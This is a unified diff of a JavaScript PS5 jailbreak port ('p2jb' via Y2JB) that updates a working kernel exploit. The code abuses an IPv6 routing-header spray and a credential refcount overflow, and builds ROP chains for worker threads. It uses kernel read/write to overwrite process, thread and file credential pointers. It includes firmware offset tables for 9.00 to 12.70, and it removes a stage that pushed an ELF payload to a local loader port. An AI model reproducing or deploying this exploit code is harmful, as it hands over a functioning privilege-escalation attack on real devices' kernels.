@@ -1,23 +1,7 @@
-(async function () {
-    const js_code = String.raw`/*
- * p2jb-y2jb - PS5 jailbreak port to Y2JB (YouTube/JS), tested on FW 11.60,
- *            offsets bundled for FW 9.00 - 12.40.
- * MIT License - see LICENSE.
- *
- * Credits:
- *   - p2jb kernel exploit (cr_ref overflow via kqueueex): Gezine / cheburek3000
- *     (https://github.com/Gezine/Luac0re)
- *   - Y2JB userland framework: Gezine (https://github.com/Gezine/Y2JB)
- *   - elfldr_1320 ELF loader binary: Gezine
- *   - notmaj0r remote_lua_loader p2jb port (secondary reference)
- *   - Edigax: multi-core leak implementation (~48 min vs ~2h)
- *
- * Usage: see README.md.
- */
 
 (async function () {
     try {
-        const p2jb_version = "P2JB 2.2 (Y2JB port v2) + bdj_unpatch";
+        const p2jb_version = "P2JB 2.3 (Y2JB port)";
 
         const PAGE_SIZE = 0x4000;
 
@@ -36,6 +20,9 @@
         const F_SETFL = 4n;
         const O_NONBLOCK = 4n;
 
+        const UMTX_OP_WAIT = 2n;
+        const UMTX_OP_WAKE = 3n;
+
         const SYSTEM_AUTHID = 0x4800000000010003n;
 
         const UCRED_SIZE = 360;
@@ -44,16 +31,12 @@
         const IOV_THREAD_NUM = 4;
         const UIO_THREAD_NUM = 4;
         const UIO_IOV_COUNT = 20n;
-
-        const LAUNCH_ELF_LOADER = true;
         const UIO_SYSSPACE = 1n;
 
         const TRIPLEFREE_ATTEMPTS = 96;
         const MAX_ROUNDS_TWIN = 10;
         const MAX_ROUNDS_TRIPLET = 500;
         const FIND_TRIPLET_FAST = 5000;
-        const FREE_FDS_NUM = 1024;
-
         const NUM_IPV6_SOCKETS = 64;
         const MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
@@ -69,6 +52,7 @@
             writev: 0x79n,
             setrlimit: 0xC3n,
         };
+
         for (const k in SYSCALL_EXTRA) {
             if (!(k in SYSCALL)) SYSCALL[k] = SYSCALL_EXTRA[k];
         }
@@ -80,14 +64,14 @@
             "11.00": { DATA_BASE_ALLPROC: 0x02875D70n },
             "12.00": { DATA_BASE_ALLPROC: 0x02885E00n },
         };
+
         const FW_ALIAS_P2JB = {
             "9.00": "9.00",
-            "9.03": "9.05", "9.04": "9.05", "9.20": "9.05", "9.40": "9.05", "9.51": "9.05", "9.60": "9.05",
-            "10.00": "10.00", "10.01": "10.00", "10.20": "10.00", "10.40": "10.00", "10.50": "10.00", "10.60": "10.00", "10.70": "10.00",
-            "11.00": "11.00", "11.02": "11.00", "11.20": "11.00", "11.40": "11.00",
-            "11.50": "11.00", "11.60": "11.00", "11.61": "11.00",
+            "9.20": "9.05", "9.40": "9.05", "9.60": "9.05",
+            "10.00": "10.00", "10.01": "10.00", "10.20": "10.00", "10.40": "10.00", "10.60": "10.00",
+            "11.00": "11.00", "11.20": "11.00", "11.40": "11.00", "11.60": "11.00",
             "12.00": "12.00", "12.02": "12.00", "12.20": "12.00", "12.40": "12.00",
-            "12.50": "12.00", "12.60": "12.00", "12.70": "12.00",
+            "12.60": "12.00", "12.70": "12.00",
         };
 
         function ensure_kernel_offset() {
@@ -260,6 +244,7 @@
         function ulog(msg) {
             return log("[p2jb] " + msg);
         }
+
         function fail(msg) { throw new Error("p2jb: " + msg); }
 
         function nanosleep_ms(ms) {
@@ -268,6 +253,7 @@
             write64(ts + 8n, BigInt((ms % 1000) * 1000000));
             syscall(SYSCALL.nanosleep, ts, 0n);
         }
+
         function sched_yield_n(n) {
             for (let i = 0; i < n; i++) syscall(SYSCALL.sched_yield);
         }
@@ -281,42 +267,71 @@
             write8(buf + 3n, BigInt(len >> 1));
             return actual_size;
         }
+
         function set_rthdr(sd, buf, len) {
             return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR,
                 buf, BigInt(len));
         }
+
         function free_rthdr(sd) {
             return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR, 0n, 0n);
         }
 
         function make_worker_sync(n) {
-
-            const raw = malloc(8 + n * 8 + 128);
+            const HDR_SIZE = 8;
+            const ARRAY_SIZE = 3 * n * 8;
+            const raw = malloc(64 + HDR_SIZE + ARRAY_SIZE + 128);
             const align = (64n - (raw % 64n)) % 64n;
-            const finished_base = raw + align;
-            for (let i = 0; i < n; i++) write64(finished_base + BigInt(i * 8), 0n);
+            const cmd_addr = raw + align;
+            const finished_base = cmd_addr + 8n;
+            const awake_base = finished_base + BigInt(n * 8);
 
-            const pipe_r = new Array(n);
-            const pipe_w = new Array(n);
+            write64(cmd_addr, 0n);
             for (let i = 0; i < n; i++) {
-                const [r, w] = create_pipe();
-                pipe_r[i] = Number(r);
-                pipe_w[i] = Number(w);
+                write64(finished_base + BigInt(i * 8), 0n);
+                write64(awake_base + BigInt(i * 8), 0n);
             }
 
-            const wake_buf = malloc(1);
-            write8(wake_buf, 0x41n);
-
-            return {
+            const ws = {
                 n,
+                cmd: cmd_addr,
+                gen: 0n,
                 finished: finished_base,
-                pipe_r,
-                pipe_w,
-                signal() {
+                awake: awake_base,
 
-                    for (let i = 0; i < n; i++) write64(finished_base + BigInt(i * 8), 0n);
+                wait_val_slots: new Array(n).fill(0n),
+                pivot_slots: new Array(n).fill(0n),
+                exit_addrs: new Array(n).fill(0n),
+                signal() {
+                    const next = this.gen + 1n;
+                    this.gen = next;
+
                     for (let i = 0; i < n; i++) {
-                        syscall(SYSCALL.write, BigInt(pipe_w[i]), wake_buf, 1n);
+                        write64(this.finished + BigInt(i * 8), 0n);
+                        write64(this.awake + BigInt(i * 8), 0n);
+                    }
+
+                    for (let i = 0; i < n; i++) {
+                        write64(this.wait_val_slots[i], next);
+                    }
+
+                    write64(this.cmd, next);
+
+                    const deadline = Date.now() + 5000;
+                    while (true) {
+                        syscall(SYSCALL.umtx_op, this.cmd, UMTX_OP_WAKE,
+                            0x7FFFFFFFn, 0n, 0n);
+                        let all_awake = true, stuck = -1;
+                        for (let i = 0; i < n; i++) {
+                            if (read64(this.awake + BigInt(i * 8)) === 0n) {
+                                all_awake = false; stuck = i; break;
+                            }
+                        }
+                        if (all_awake) break;
+                        if (Date.now() > deadline)
+                            fail("worker_sync.signal: WAKE timeout - worker " +
+                                stuck + "/" + n + " never reached WAIT exit");
+                        syscall(SYSCALL.sched_yield);
                     }
                 },
                 wait(timeout_ms) {
@@ -325,7 +340,7 @@
                     while (true) {
                         let done = true, stuck = -1;
                         for (let i = 0; i < n; i++) {
-                            if (read64(finished_base + BigInt(i * 8)) === 0n) {
+                            if (read64(this.finished + BigInt(i * 8)) === 0n) {
                                 done = false; stuck = i; break;
                             }
                         }
@@ -336,7 +351,16 @@
                         syscall(SYSCALL.sched_yield);
                     }
                 },
+                terminate() {
+
+                    for (let i = 0; i < n; i++) {
+                        write64(this.pivot_slots[i], this.exit_addrs[i]);
+                    }
+                    this.signal();
+                    this.wait();
+                },
             };
+            return ws;
         }
 
         function build_worker_chain(ws, wid, fd, iov_ptr, sysnum, cpu_mask_addr, rt_params_addr) {
@@ -345,8 +369,8 @@
             for (let k = 0n; k < 0x4000n; k += 8n) write64(buf + k, 0n);
             const entry = buf + 0x4000n;
 
-            const dummy_buf = malloc(8);
-            const pipe_rfd = ws.pipe_r[wid];
+            const cmd_addr = ws.cmd;
+            const awake_addr = ws.awake + BigInt(wid * 8);
             const finished_addr = ws.finished + BigInt(wid * 8);
             const count_arg = sysnum === SYSCALL.recvmsg ? 0n : UIO_IOV_COUNT;
 
@@ -374,12 +398,21 @@
             emit(ROP.ret);
             const LOOP_START = idx;
 
-            const readBase = idx;
-            emit(ROP.pop_rax); emit(SYSCALL.read);
-            emit(ROP.pop_rdi); emit(BigInt(pipe_rfd));
-            emit(ROP.pop_rsi); emit(dummy_buf);
-            emit(ROP.pop_rdx); emit(1n);
+            const waitBase = idx;
+            emit(ROP.pop_rax); emit(SYSCALL.umtx_op);
+            emit(ROP.pop_rdi); emit(cmd_addr);
+            emit(ROP.pop_rsi); emit(UMTX_OP_WAIT);
+            emit(ROP.pop_rdx); emit(0n);
+            emit(ROP.pop_rcx); emit(0n);
+            emit(ROP.pop_r8); emit(0n);
             emit(syscall_wrapper);
+            emit(ROP.ret);
+            const wait_val_slot = at(waitBase + 7);
+
+            const awakeBase = idx;
+            emit(ROP.pop_rax); emit(1n);
+            emit(ROP.pop_rdi); emit(awake_addr);
+            emit(ROP.mov_qword_rdi_rax);
             emit(ROP.ret);
 
             const workBase = idx;
@@ -395,15 +428,24 @@
                 emit(ROP.pop_rax); emit(value);
                 emit(ROP.mov_qword_rdi_rax);
             };
-            repairSlot(readBase + 0, ROP.pop_rax);
-            repairSlot(readBase + 1, SYSCALL.read);
-            repairSlot(readBase + 2, ROP.pop_rdi);
-            repairSlot(readBase + 3, BigInt(pipe_rfd));
-            repairSlot(readBase + 4, ROP.pop_rsi);
-            repairSlot(readBase + 5, dummy_buf);
-            repairSlot(readBase + 6, ROP.pop_rdx);
-            repairSlot(readBase + 7, 1n);
-            repairSlot(readBase + 8, syscall_wrapper);
+            repairSlot(waitBase + 0, ROP.pop_rax);
+            repairSlot(waitBase + 1, SYSCALL.umtx_op);
+            repairSlot(waitBase + 2, ROP.pop_rdi);
+            repairSlot(waitBase + 3, cmd_addr);
+            repairSlot(waitBase + 4, ROP.pop_rsi);
+            repairSlot(waitBase + 5, UMTX_OP_WAIT);
+            repairSlot(waitBase + 6, ROP.pop_rdx);
+
+            repairSlot(waitBase + 8, ROP.pop_rcx);
+            repairSlot(waitBase + 9, 0n);
+            repairSlot(waitBase + 10, ROP.pop_r8);
+            repairSlot(waitBase + 11, 0n);
+            repairSlot(waitBase + 12, syscall_wrapper);
+            repairSlot(awakeBase + 0, ROP.pop_rax);
+            repairSlot(awakeBase + 1, 1n);
+            repairSlot(awakeBase + 2, ROP.pop_rdi);
+            repairSlot(awakeBase + 3, awake_addr);
+            repairSlot(awakeBase + 4, ROP.mov_qword_rdi_rax);
             repairSlot(workBase + 0, ROP.pop_rax);
             repairSlot(workBase + 1, sysnum);
             repairSlot(workBase + 2, ROP.pop_rdi);
@@ -419,9 +461,21 @@
             emit(ROP.mov_qword_rdi_rax);
 
             emit(ROP.pop_rsp);
+            const pivotSlotIdx = idx;
             emit(at(LOOP_START));
 
-            return { entry };
+            if (idx % 2 !== 0) emit(ROP.ret);
+            const EXIT_START = idx;
+            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
+            emit(ROP.pop_rdi); emit(0n);
+            emit(syscall_wrapper);
+
+            return {
+                entry,
+                wait_val_slot,
+                pivotAddr: at(pivotSlotIdx),
+                exitAddr: at(EXIT_START),
+            };
         }
 
         function make_state() {
@@ -549,6 +603,9 @@
                     S.iov_ws, i, S.iov_sock_a, S.recvmsg_hdr, SYSCALL.recvmsg,
                     S.cpu_mask, S.rt_params,
                 );
+                S.iov_ws.wait_val_slots[i] = ch.wait_val_slot;
+                S.iov_ws.pivot_slots[i] = ch.pivotAddr;
+                S.iov_ws.exit_addrs[i] = ch.exitAddr;
                 spawn_leak_worker(ch.entry);
             }
             for (let i = 0; i < UIO_THREAD_NUM; i++) {
@@ -556,6 +613,9 @@
                     S.uio_read_ws, i, S.uio_sock_b, S.uio_iov_read, SYSCALL.writev,
                     S.cpu_mask, S.rt_params,
                 );
+                S.uio_read_ws.wait_val_slots[i] = ch.wait_val_slot;
+                S.uio_read_ws.pivot_slots[i] = ch.pivotAddr;
+                S.uio_read_ws.exit_addrs[i] = ch.exitAddr;
                 spawn_leak_worker(ch.entry);
             }
             for (let i = 0; i < UIO_THREAD_NUM; i++) {
@@ -563,6 +623,9 @@
                     S.uio_write_ws, i, S.uio_sock_a, S.uio_iov_write, SYSCALL.readv,
                     S.cpu_mask, S.rt_params,
                 );
+                S.uio_write_ws.wait_val_slots[i] = ch.wait_val_slot;
+                S.uio_write_ws.pivot_slots[i] = ch.pivotAddr;
+                S.uio_write_ws.exit_addrs[i] = ch.exitAddr;
                 spawn_leak_worker(ch.entry);
             }
         }
@@ -589,7 +652,9 @@
         function rthdr_set(S, idx) {
             return set_rthdr(S.ipv6_sockets[idx], S.rthdr_spray, S.rthdr_spray_len);
         }
+
         function rthdr_free_idx(S, idx) { return free_rthdr(S.ipv6_sockets[idx]); }
+
         function rthdr_get_tag(S, idx) {
             write32(S.tag_len, 8n);
             const r = syscall(SYSCALL.getsockopt,
@@ -896,6 +961,7 @@
             S.active_uio_mode = mode;
             (mode === 0 ? S.uio_read_ws : S.uio_write_ws).signal();
         }
+
         function wait_uio(S) {
             (S.active_uio_mode === 0 ? S.uio_read_ws : S.uio_write_ws).wait();
         }
@@ -1232,6 +1298,17 @@
                 bump(fp, 0x100);
             }
 
+            if (S.free_fd_idx < S.free_fds.length) {
+                const sample_fd = S.free_fds[S.free_fd_idx];
+                const sample_fp = S.kread64(S.fd_ofiles + BigInt(sample_fd) * S.OFF.FILEDESCENT_SIZE);
+                if (sample_fp !== 0n && (sample_fp >> 48n) === 0xFFFFn) {
+                    const fcred = S.kread64(sample_fp + 0x10n);
+                    if (fcred !== 0n && (fcred >> 48n) === 0xFFFFn) {
+                        S.ucred_A = fcred;
+                    }
+                }
+            }
+
             for (const fd of S.ipv6_sockets) null_rthdr(fd);
 
             for (let i = S.free_fd_idx; i < S.free_fds.length; i++) {
@@ -1253,12 +1330,12 @@
             await ulog("stage3b: workers signalled (D5, left parked)");
 
             {
-            const [sr, sw] = create_pipe();
-            const sigio_rfd = Number(sr), sigio_wfd = Number(sw);
-            const our_pid = syscall(SYSCALL.getpid) & 0xFFFFFFFFn;
-            const pid_buf = malloc(4);
-            write32(pid_buf, our_pid);
-            syscall(SYSCALL.ioctl, BigInt(sigio_rfd), 0x8004667Cn, pid_buf);
+                const [sr, sw] = create_pipe();
+                const sigio_rfd = Number(sr), sigio_wfd = Number(sw);
+                const our_pid = syscall(SYSCALL.getpid) & 0xFFFFFFFFn;
+                const pid_buf = malloc(4);
+                write32(pid_buf, our_pid);
+                syscall(SYSCALL.ioctl, BigInt(sigio_rfd), 0x8004667Cn, pid_buf);
 
                 const sigio_fp = S.kread64(S.fd_ofiles +
                     BigInt(sigio_rfd) * S.OFF.FILEDESCENT_SIZE);
@@ -1440,10 +1517,6 @@
 
         async function stage_load_elf(S) {
             await ulog("stage_elfldr: entered (Y2JB 1.4 aioshellcode handoff)");
-            if (!LAUNCH_ELF_LOADER) {
-                await ulog("stage_elfldr: LAUNCH_ELF_LOADER=false - skipped");
-                return;
-            }
             if (!S.data_base_ok) {
                 await ulog("stage_elfldr: kernel data_base not resolved - skipped");
                 send_notification("Stage 7\nelf loader skipped (no data_base)");
@@ -1480,26 +1553,6 @@
             }
         }
 
-        async function stage_bdj_unpatch() {
-            const payload_path = "/mnt/sandbox/" + get_title_id() + "_000/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY=/bdj_unpatch_1320_v2.elf";
-            const payload_name = "bdj_unpatch_1320_v2.elf";
-
-            if (!is_jailbroken()) {
-                fail("elfldr is not running!");
-            }
-
-            if (file_exists(payload_path)) {
-                const file_data = await read_file(payload_path);
-                if (!file_data) {
-                    fail("Failed to read bdj_unpatch_v2.elf");
-                }
-
-                await send_network("127.0.0.1", 9021, SOCK_STREAM, file_data);
-            } else {
-                fail("\"" + payload_name + "\" not found!");
-            }
-        }
-
         send_notification(p2jb_version + "\nport by matem6");
 
         {
@@ -1512,10 +1565,10 @@
         }
 
         try {
-            // if (typeof is_jailbroken === "function" && is_jailbroken()) {
-            //     send_notification("p2jb: already jailbroken");
-            //     return;
-            // }
+            if (typeof is_jailbroken === "function" && is_jailbroken()) {
+                send_notification("p2jb: already jailbroken");
+                return;
+            }
             failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
             if (file_exists(failcheck_path) ||
                 file_exists("/user/temp/common_temp/p2jb.fail")) {
@@ -1536,27 +1589,37 @@
         setup_iov_buffers(S);
         setup_uio_buffers(S);
         setup_pipes_kernrw(S);
+
+        await ulog(p2jb_version + " - port by matem6");
         await ulog("pipes master=" + S.master_rfd + "," + S.master_wfd +
             " victim=" + S.victim_rfd + "," + S.victim_wfd);
 
         const leak_nw = LEAK_CORES.length;
-        let eta_str;
+        let eta_minutes;
+
         switch (leak_nw) {
-            case 1: eta_str = "~2h"; break;
-            case 2: eta_str = "~1h 30 min"; break;
-            case 3: eta_str = "~1h"; break;
-            case 4: eta_str = "~50 min"; break;
-            default: {
-                const m = Math.round(48 * 4 / leak_nw);
-                eta_str = m < 60
-                    ? "~" + m + " min"
-                    : "~" + Math.floor(m / 60) + "h " + (m % 60) + " min";
-                break;
-            }
+            case 1: eta_minutes = 120; break;
+            case 2: eta_minutes = 90; break;
+            case 3: eta_minutes = 60; break;
+            case 4: eta_minutes = 50; break;
+            default: eta_minutes = Math.round(48 * 4 / leak_nw); break;
         }
-        await ulog("host OK - starting " + leak_nw + "-core leak (" + eta_str +
-            "); no further log output until stage 0 (this is normal, " +
-            "do not interrupt)");
+        const eta_str = eta_minutes < 60
+            ? "~" + eta_minutes + " min"
+            : "~" + Math.floor(eta_minutes / 60) + "h" +
+            (eta_minutes % 60 ? " " + (eta_minutes % 60) + " min" : "");
+
+        const fmt_hm = d =>
+            String(d.getHours()).padStart(2, '0') + ':' +
+            String(d.getMinutes()).padStart(2, '0');
+
+        const t_start = new Date();
+        const t_eta = new Date(t_start.getTime() + eta_minutes * 60000);
+
+        await ulog("host OK - starting " + leak_nw + "-core leak at " +
+            fmt_hm(t_start) + ", ETA stage0 ~" + fmt_hm(t_eta) +
+            " (" + eta_str + "); no further log output until then " +
+            "(this is normal, do not interrupt)");
 
         setup_workers(S);
         setup_ipv6_spray(S);
@@ -1579,21 +1642,142 @@
         await stage7(S);
         await stage_load_elf(S);
 
+        try {
+            const B = S.proc_ucred;
+            if (B === 0n || (B >> 48n) !== 0xFFFFn) {
+                await ulog("post-jb migrate: B invalid, skip");
+            } else {
+
+                const nfiles = Number(S.kread32(S.fd_ofiles - S.OFF.FDESCENTTBL_HDR) & 0xFFFFFFFFn);
+                let fd_migrated = 0;
+                const migrated_creds = new Set();
+
+                if (nfiles > 0 && nfiles <= 0x10000) {
+                    for (let i = 0; i < nfiles; i++) {
+                        const fp = S.kread64(S.fd_ofiles + BigInt(i) * S.OFF.FILEDESCENT_SIZE);
+                        if (fp === 0n || (fp >> 48n) !== 0xFFFFn) continue;
+                        const fcred = S.kread64(fp + 0x10n);
+                        if (fcred === B) continue;
+                        if ((fcred >> 48n) !== 0xFFFFn) continue;
+                        S.kwrite64(fp + 0x10n, B);
+                        migrated_creds.add(toHex(fcred));
+                        fd_migrated++;
+                    }
+                }
+
+                await ulog("post-jb migrate: " + fd_migrated + " fds f_cred -> B " +
+                    "(" + migrated_creds.size + " distinct cred kptrs replaced)");
+
+                const TD_UCRED_OFF = 0x140n;
+                let td_migrated = 0;
+                const migrated_tcreds = new Set();
+                const main_thread = S.kread64(S.curproc + 0x10n);
+
+                if (main_thread !== 0n && (main_thread >> 48n) === 0xFFFFn) {
+                    let td = main_thread, walked = 0;
+                    while (td !== 0n && (td >> 48n) === 0xFFFFn && walked < 500) {
+                        walked++;
+                        if (S.kread64(td + 0x08n) !== S.curproc) {
+                            await ulog("post-jb migrate: td_proc mismatch, abort thread walk");
+                            break;
+                        }
+                        const tu = S.kread64(td + TD_UCRED_OFF);
+                        if (tu !== B && (tu >> 48n) === 0xFFFFn) {
+                            S.kwrite64(td + TD_UCRED_OFF, B);
+                            migrated_tcreds.add(toHex(tu));
+                            td_migrated++;
+                        }
+                        td = S.kread64(td + 0x10n);
+                    }
+                }
+
+                await ulog("post-jb migrate: " + td_migrated + " threads td_ucred -> B " +
+                    "(" + migrated_tcreds.size + " distinct cred kptrs replaced)");
+
+                const total = fd_migrated + td_migrated;
+
+                if (total > 0) {
+                    const rc_old = Number(S.kread32(B) & 0xFFFFFFFFn);
+                    S.kwrite32(B, rc_old + total);
+                    await ulog("post-jb migrate: cr_ref(B) " +
+                        ("0x" + rc_old.toString(16)) + " -> " +
+                        ("0x" + (rc_old + total).toString(16)) +
+                        " (+" + total + ")");
+                } else {
+                    await ulog("post-jb migrate: nothing to migrate (all already on B)");
+                }
+            }
+        } catch (e) {
+            await ulog("post-jb migrate: failed: " + e.message +
+                " (jailbreak unaffected, close-KP may still fire)");
+        }
+
+        try {
+            S.iov_ws.terminate();
+            S.uio_read_ws.terminate();
+            S.uio_write_ws.terminate();
+            await js_sleep(200);
+            await ulog("post-jb: 12 iov/uio workers terminated (thr_exit)");
+        } catch (e) {
+            await ulog("post-jb: worker terminate failed: " + e.message +
+                " (jailbreak unaffected)");
+        }
+
+        try {
+            const A = S.ucred_A || 0n;
+            const B = S.proc_ucred;
+
+            if (A === 0n || (A >> 48n) !== 0xFFFFn) {
+                await ulog("post-jb pin: A invalid (" + toHex(A) + "), skip");
+            } else if (B === 0n || (B >> 48n) !== 0xFFFFn) {
+                await ulog("post-jb pin: B invalid (" + toHex(B) + "), skip");
+            } else if (A === B) {
+                await ulog("post-jb pin: A == B (unexpected), skip");
+            } else {
+                const PIN_REFS = 0x10000000;
+                const buf = malloc(UCRED_SIZE);
+
+                S.kread(buf, B, UCRED_SIZE);
+                const old_A_ref = (S.kread32(A) & 0xFFFFFFFFn);
+                write32(buf, BigInt(PIN_REFS));
+                S.kwrite(A, buf, UCRED_SIZE);
+
+                const new_A_ref = (S.kread32(A) & 0xFFFFFFFFn);
+                if (Number(new_A_ref) === PIN_REFS) {
+                    await ulog("post-jb pin: A=" + toHex(A) +
+                        " overwritten with B-clone, cr_ref " +
+                        toHex(old_A_ref) + " -> 0x" + PIN_REFS.toString(16) +
+                        " (stale freelist consumers now see safe ucred)");
+                } else {
+                    await ulog("post-jb pin: VERIFY FAILED, cr_ref(A)=" +
+                        toHex(new_A_ref) + " (expected 0x" +
+                        PIN_REFS.toString(16) + ")");
+                }
+            }
+        } catch (e) {
+            await ulog("post-jb pin: failed: " + e.message +
+                " (jailbreak unaffected, close-KP may still fire)");
+        }
+
+        try {
+            const buf_before = S.kread64(S.master_pipe_data + 0x10n);
+            S.kwrite64(S.master_pipe_data + 0x10n, 0n);
+            
+            await ulog("post-jb: master.pipe_buffer.buffer NULL'd " +
+                "(was " + toHex(buf_before) + " = victim_pipe_data, " +
+                "kernel free-path will now skip vm_map_remove)");
+        } catch (e) {
+            await ulog("post-jb: pipe_buffer restore failed: " + e.message +
+                " (jailbreak unaffected)");
+        }
+
         pin_to_core(S.orig_main_core);
         await ulog("restored main thread to core " + S.orig_main_core);
 
-        await ulog("Wait for elf loader...");
-        await nanosleep_ms(4000);
-
-        await stage_bdj_unpatch();
-
-        await ulog("=== p2jb + bdj_unpatch complete ===");
+        await ulog("=== p2jb complete ===");
 
     } catch (e) {
         try { await log("p2jb FATAL: " + e.message); } catch (_) { }
         try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }
     }
-})();`;
-
-    await eval(js_code);
 })();
